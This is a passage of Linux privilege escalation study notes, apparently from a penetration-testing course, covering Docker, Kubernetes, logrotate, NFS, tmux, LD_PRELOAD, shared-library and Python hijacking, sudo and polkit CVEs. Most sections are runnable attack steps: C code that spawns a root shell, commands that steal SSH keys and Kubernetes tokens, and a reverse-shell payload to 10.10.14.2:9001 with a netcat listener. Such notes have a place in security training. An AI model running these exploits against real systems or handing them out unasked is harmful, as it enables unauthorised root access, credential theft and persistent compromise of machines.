ls -l /mnt/root
```

This exposes the host root filesystem, enabling **privilege escalation**.

---

# Docker

## Docker Basics
- **Docker**: open-source tool for portable, consistent runtime environments.
- Uses **containers** → isolated user-space environments at OS level.
- Containers = lightweight, resource-efficient compared to VMs.
- **Docker Image** = blueprint/template (code, deps, configs).
- **Docker Container** = instance of an image (mutable, isolated).
- **Dockerfile** = defines build steps for images.

---

## Docker Architecture
- **Client-Server Model**:
  - **Docker Daemon** (server): manages containers/images, isolation, logs, networking, volumes.
  - **Docker Client**: CLI to issue commands via REST API or Unix socket.
- **Docker Compose**: orchestration of multi-container apps using `docker-compose.yml`.
- **Docker Desktop**: GUI for managing containers (supports Kubernetes).


## Privilege Escalation with Docker

### 1. Shared Directories (Volume Mounts)
- Host directories/files mounted inside containers.
- Can persist data, share code, or enable collaboration.
- If RW, attacker can access sensitive host files.

**Example:**
```bash
root@container:/hostsystem/home/cry0l1t3$ ls -l
-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh

root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
````

Use key to SSH into host:

```bash
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### 2. Docker Sockets

* Located at `/var/run/docker.sock`.
* Bridge between **client** ↔ **daemon**.
* If exposed/misconfigured → attacker can control Docker.

**Check for socket:**

```bash
ls -al
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```

**If `docker` binary missing, upload it:**

```bash
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
```

**Enumerate containers:**

```bash
/tmp/docker -H unix:///app/docker.sock ps
```

**Spawn privileged container mapping host root:**

```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
```

**Access host filesystem:**

```bash
/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
cat /hostsystem/root/.ssh/id_rsa
```


### 3. Docker Group

* If user is in **docker group**, they can control Docker daemon → root.

```bash
id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

**List images:**

```bash
docker image ls
```

**Spawn root shell via socket:**

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

---


# Kubernetes

## 1. What is Kubernetes (K8s)?

* Open-source container orchestration platform (originally by Google; now CNCF).
* Manages deployment, scaling, networking, storage, and lifecycle of containers.
* Key concepts: **Control Plane** (master) and **Worker Nodes** (minions).

### 2. Core concepts

* **Pod** — smallest deployable unit; may contain 1+ containers; has its own IP/hostname.
* **Service** — stable network endpoint for Pods (load balancing, discovery).
* **Deployment** — desired-state controller for Pods/ReplicaSets.
* **etcd** — cluster state datastore.
* **kube-apiserver** — central API endpoint (port `6443`).


### 3. Control Plane components & common ports

* `etcd` — `2379`, `2380`
* `kube-apiserver` — `6443`
* `kube-scheduler` — `10251`
* `controller-manager` — `10252`
* `kubelet` API — `10250` (secure), `10255` (read-only, deprecated in many setups)


### 4. Attack surface to check (high level)

* **Open/accessible kube-apiserver** (unauthenticated or weak auth).
* **Exposed kubelet API** (unauthenticated read or exec access).
* **ServiceAccount tokens** mounted in pods (`/var/run/secrets/...`).
* **Over-privileged ServiceAccounts / RBAC misconfig**.
* **HostPath volumes** or container running as root → host compromise.
* **Image vulnerabilities** (outdated images with CVEs).
* **Automounting of ServiceAccount token** in pods (default behavior).


### 5. Useful reconnaissance & exploitation commands

* Test API server accessibility:

```bash
curl https://<API_SERVER>:6443 -k
# typical anonymous response: 403 Forbidden (system:anonymous)
```

* Enumerate pods via kubelet (if kubelet API open):

```bash
curl https://<NODE_IP>:10250/pods -k | jq .
```

* Use `kubeletctl` (example) to list pods and scan for RCE:

```bash
kubeletctl -i --server <NODE_IP> pods
kubeletctl -i --server <NODE_IP> scan rce
```

* Exec into a container (if allowed via kubelet):

```bash
kubeletctl -i --server <NODE_IP> exec "id" -p <POD_NAME> -c <CONTAINER_NAME>
# Shows uid/gid (look for uid=0 → root)
```

* Extract service account token & cluster CA from a pod:

```bash
kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <C>
kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <C>
```

* Test permissions (once you have a token + CA):

```bash
export TOKEN=$(cat ./k8.token)
kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://<API_SERVER>:6443 auth can-i --list
```

### 6. Typical privilege escalation path (concise)

1. Discover **open kubelet** or API with weak auth.
2. List pods → identify pod with writable mounts / root container / automount token.
3. `exec` into pod → check `id` (root?) and look for mounted service account token.
4. Read token & CA → use token to query API server.
5. Use `auth can-i` to enumerate allowed actions. If allowed to `create` pods or `create` other resources, create a pod that mounts host root (`hostPath: path: /`) to access host filesystem or SSH keys.
6. Use created pod to extract `/root/.ssh/id_rsa`, kubeconfig, or other secrets → lateral movement or persistent access.

---

# 🌀 Logrotate 

## 📘 What is Logrotate?
Logrotate is a Linux utility designed to manage log files by:
- Archiving or deleting old logs
- Preventing disk overflow
- Improving log search efficiency

Log files in `/var/log` help administrators diagnose system issues and monitor service health.

## ⚙️ Key Features
Logrotate allows configuration based on:
- **Size** of log files
- **Age** of log files
- **Actions** to take (e.g., compress, delete, rename)

## 📄 Usage
```bash
$ man logrotate
$ logrotate --help
```

### Common Options
- `-d` Debug mode (no changes made)
- `-f` Force rotation
- `-v` Verbose output
- `-s` Specify state file
- `-l` Log to file or syslog

## 🛠 Configuration
Main config file: `/etc/logrotate.conf`

### Example:
```conf
weekly
su root adm
rotate 4
create
#include /etc/logrotate.d
```

### Status File:
Tracks last rotation date:
```bash
$ sudo cat /var/lib/logrotate.status
/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

### Per-Service Configs:
Stored in `/etc/logrotate.d/`

Example: `/etc/logrotate.d/dpkg`
```conf
/var/log/dpkg.log {
    monthly
    rotate 12
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}
```

## 🚨 Exploitation Requirements
- Write access to log files
- Logrotate must run as root
- Vulnerable versions:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

## 🧨 Exploit: Logrotten
### Setup
```bash
$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten
$ gcc logrotten.c -o logrotten
```

### Payload
Create a reverse shell payload:
```bash
$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

### Confirm Logrotate Behavior
```bash
$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create
```

### Start Listener
```bash
$ nc -nlvp 9001
```

### Run Exploit
```bash
$ ./logrotten -p ./payload /tmp/tmp.log
```

---

# 🛠️ Miscellaneous Privilege Escalation Techniques

## 📡 Passive Traffic Capture

Unprivileged users may capture network traffic if `tcpdump` is installed. This can expose sensitive data such as:

- Cleartext credentials from protocols like HTTP, FTP, POP, IMAP, Telnet, SMTP
- Credit card numbers, SNMP community strings
- Hashes (Net-NTLMv2, SMBv2, Kerberos) for offline brute-force attacks

**Tools to analyze captured traffic:**
- `net-creds`
- `PCredz`

## 📁 Weak NFS Privileges

NFS (Network File System) allows remote access to shared directories. It operates over TCP/UDP port `2049`.

### 🔍 Discovering NFS Shares
```bash
showmount -e <NFS-IP>
```

**Example Output:**
```
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

### 🔧 NFS Export Options
| Option         | Description |
|----------------|-------------|
| `root_squash`  | Maps root to `nfsnobody`, preventing SUID uploads |
| `no_root_squash` | Allows remote root to create files as root, enabling SUID binaries |

**Example `/etc/exports`:**
```
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

### 🧪 Exploiting NFS with SUID Binary
1. Create a shell binary:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

2. Compile and copy to NFS mount:
```bash
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

3. Execute from low-privileged user:
```bash
./shell
id
```

**Result:**
```bash
uid=0(root) gid=0(root) groups=0(root),...
```

## 🖥️ Hijacking Tmux Sessions

`tmux` allows persistent terminal sessions. If a root session is created with weak permissions, it can be hijacked.

### 🧵 Creating Shared Session
```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

### 🔍 Check Running Tmux
```bash
ps aux | grep tmux
```

### 🔐 Check Socket Permissions
```bash
ls -la /shareds
```

**Expected Output:**
```
srw-rw---- 1 root devs ...
```

### 👥 Check Group Membership
```bash
id
```

**Expected Output:**
```
groups=...,1011(devs)
```

### 📥 Attach to Session
```bash
tmux -S /shareds
id
```

**Result:**
```bash
uid=0(root) gid=0(root) groups=0(root)
```

---

# Kernel Exploits

* **What:** Kernel-level exploits leverage kernel vulnerabilities to run code as `root`.

* **Example:** Dirty COW — `CVE-2016-5195`.

* **Why common:** Legacy/unpatched systems; sometimes excluded from patching for compatibility.

* **Quick identification:**

  * Get kernel string:

```bash
uname -a
```

* Get distro/release info:

```bash
cat /etc/lsb-release
```

* Search the exact kernel string (e.g. `"4.4.0-116-generic exploit"`) to find PoCs.

* **PoC workflow (as given):**

  1. Obtain PoC (example method mentioned):

```bash
wget <exploit_url>
```

2. Compile exploit and make executable:

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

3. Run exploit:

```bash
./kernel_exploit
```

4. Confirm root:

```bash
whoami
```

* **Caution:** Kernel exploits can cause system instability — **use caution**, avoid running on production systems.

---

# 🧠 Shared Libraries in Linux

## 📚 Overview
- Linux uses **shared object libraries** to avoid redundant code across programs.
- Two types:
  - **Static libraries** (`.a`): compiled into the binary, cannot be changed.
  - **Dynamic libraries** (`.so`): loaded at runtime, can be modified.

## 📍 Library Location Methods
- Compiler flags: `-rpath`, `-rpath-link`
- Environment variables: `LD_RUN_PATH`, `LD_LIBRARY_PATH`
- Default directories: `/lib`, `/usr/lib`
- Config file: `/etc/ld.so.conf`

## 🔍 Viewing Linked Libraries
Use `ldd` to list shared libraries used by a binary:
```bash
ldd /bin/ls
```

## ⚠️ LD_PRELOAD Environment Variable
- Allows preloading a custom `.so` library before executing a binary.
- Overrides default functions with those in the specified library.

---

# 🚨 LD_PRELOAD Privilege Escalation Example

## 🧑‍💻 Sudo Permissions
```bash
sudo -l
```
- User `daniel.carter` can run `/usr/sbin/apache2 restart` as root without a password.
- `env_keep+=LD_PRELOAD` allows LD_PRELOAD to persist in sudo environment.

## 🛠️ Malicious Library Code
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

## 🧪 Compile the Library
```bash
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

## 🚀 Exploit with LD_PRELOAD
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## ✅ Result
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

> This technique leverages LD_PRELOAD to gain root shell access by injecting a custom shared library.

---

# Shared Object Hijacking

## 🧩 What Are Shared Libraries?

In Linux, programs often rely on **shared libraries** to perform common tasks. These libraries contain reusable code, so developers don’t have to rewrite the same functions over and over.

There are two types:
- **Static libraries** (`.a`): permanently built into the program.
- **Shared (dynamic) libraries** (`.so`): loaded when the program runs, and can be swapped or hijacked.

## 🔐 What Is a SETUID Binary?

A **SETUID binary** is a special kind of executable file that runs with the permissions of its owner — often **root**. This means if a regular user runs a SETUID binary owned by root, the program executes with **root privileges**.

Example:
```bash
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
- `rws` → the `s` means SETUID is enabled.
- `payroll` is a binary owned by root.

## 🔍 Checking Dependencies with `ldd`

To see which shared libraries a binary uses, we run:
```bash
ldd payroll
```

Output:
```
libshared.so => /development/libshared.so
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

Here, `libshared.so` is a **custom library** loaded from `/development`.

## ⚠️ Why This Is Dangerous

The `/development` folder is **world-writable**:
```bash
drwxrwxrwx  2 root root 4096 Sep  1 22:06 /development/
```

This means **any user** can place files there. If a binary loads a library from this folder, a malicious user can **replace or inject** their own version of the library.

## 🧪 How the Binary Chooses Libraries

Using `readelf`, we can inspect the binary’s configuration:
```bash
readelf -d payroll | grep PATH
```

Output:
```
Library runpath: [/development]
```

This tells us the binary **prefers** libraries from `/development` over system ones. So if we place a fake `libshared.so` there, the binary will use it.


## 🧨 Exploiting the Vulnerability

### Step 1: Identify the Missing Function

Run the binary:
```bash
./payroll
```

Error:
```
symbol lookup error: undefined symbol: dbquery
```

This means the binary expects a function called `dbquery` inside `libshared.so`.

### Step 2: Create a Malicious Library

Write a C file that defines `dbquery` and gives us a root shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

Compile it as a shared object:
```bash
gcc -fPIC -shared -o /development/libshared.so dbquery.c
```

- `-fPIC`: generates position-independent code.
- `-shared`: creates a shared library.
- `-o`: names the output file.

### Step 3: Run the Vulnerable Binary

Now execute the binary again:
```bash
./payroll
```

Since it loads our malicious `libshared.so`, it will call `dbquery()` — which gives us a **root shell**.

---

# Python Library Hijacking 

## 📌 Overview
Python's popularity stems from its simplicity and vast ecosystem of libraries. However, this flexibility can introduce security vulnerabilities, especially in environments with misconfigured permissions.


## 📚 Commonly Used Libraries
- **NumPy**: Numerical computing, arrays, matrices, linear algebra, random number generation.
- **Pandas**: Data analysis and manipulation, especially time series.
- **Python Standard Library**: Built-in modules for various tasks, loaded only when imported to maintain performance.

## 📥 Importing Modules
```python
# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```


## ⚠️ Library Hijacking Vectors
1. **Wrong Write Permissions**
2. **Library Path Precedence**
3. **PYTHONPATH Environment Variable**

## 1️⃣ Wrong Write Permissions

### Scenario:
- A Python script (`mem_status.py`) with SUID permissions imports a module (`psutil`).
- If the module file is world-writable, it can be modified to include malicious code.

### Example:
```bash
ls -l mem_status.py
# -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

### Original Script:
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

### Hijacked Module:
```python
def virtual_memory():
    import os
    os.system('id')  # Malicious code
    ...
```

### Execution:
```bash
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
```

## 2️⃣ Library Path Precedence

### Python Module Search Order:
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

### Exploit Conditions:
- Target module is in a lower-priority path.
- Attacker can write to a higher-priority path.

### Example:
- `psutil` is in `/usr/local/lib/python3.8/dist-packages`
- `/usr/lib/python3.8` is writable and higher in priority.

### Malicious Module:
```python
# /usr/lib/python3.8/psutil.py
import os

def virtual_memory():
    os.system('id')
```

### Result:
```bash
sudo /usr/bin/python3 mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
```

## 3️⃣ PYTHONPATH Environment Variable

### Description:
- PYTHONPATH defines directories Python searches for modules.
- If `sudo` allows `SETENV`, the user can override PYTHONPATH.

### Check Permissions:
```bash
sudo -l
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

### Exploit:
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
```

---

# Sudo 

## 📌 What is Sudo?
- Runs commands with elevated privileges (usually root).
- Controlled via `/etc/sudoers`.
- Adds security by restricting access to sensitive commands.


## ⚙️ Sudoers File Example
```bash
cry0l1t3 ALL=(ALL) /usr/bin/id
```
- Grants user `cry0l1t3` permission to run `/usr/bin/id` as root.



## 🛠️ CVE-2021-3156 – Heap Overflow
- Affects sudo versions like 1.8.31 (Ubuntu 20.04).
- Exploit allows root shell via buffer overflow in `sudoedit`.

### Steps:
```bash
sudo -V
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich 1
# id → uid=0(root)
```


## 🚨 CVE-2019-14287 – Policy Bypass
- Affects sudo < 1.8.28.
- Exploit: `sudo -u#-1 command` runs as root.

### Example:
```bash
sudo -u#-1 id
# uid=0(root)
```

---

# Polkit 

## 📌 What is Polkit?
- Authorization service for Linux systems.
- Controls access between user applications and privileged system components.
- Permissions can be set per user/app with various scopes (one-time, session, unlimited).

## 📁 Key Components
- **Actions/Policies**: `/usr/share/polkit-1/actions`
- **Rules**: `/usr/share/polkit-1/rules.d`
- **Local Rules**: `/etc/polkit-1/localauthority/50-local.d/*.pkla`


## 🛠️ Polkit Tools
- `pkexec`: Run commands as another user (like `sudo`)
- `pkaction`: List available actions
- `pkcheck`: Check if an action is authorized

### Example:
```bash
pkexec -u root id
# uid=0(root) gid=0(root) groups=0(root)
```


## 🚨 CVE-2021-4034 – PwnKit
- Memory corruption in `pkexec` → Privilege escalation to root.
- Present for 10+ years, disclosed in Nov 2021.

### Exploit Steps:
```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
# id → uid=0(root)
```

---
